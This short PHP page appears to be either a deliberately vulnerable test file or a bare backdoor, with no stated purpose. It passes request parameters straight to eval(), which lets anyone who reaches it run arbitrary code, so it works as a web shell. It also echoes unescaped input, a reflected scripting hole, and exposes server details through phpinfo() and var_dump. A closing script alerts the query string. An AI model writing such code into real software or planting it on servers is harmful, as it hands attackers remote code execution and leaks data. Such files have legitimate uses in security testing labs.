<?php
$x = $_GET['x'];
echo $x;
eval($x);
phpinfo();

var_dump($_GET);

eval($_GET['y']);
?>

<script>

alert(window.location.search);

</script>
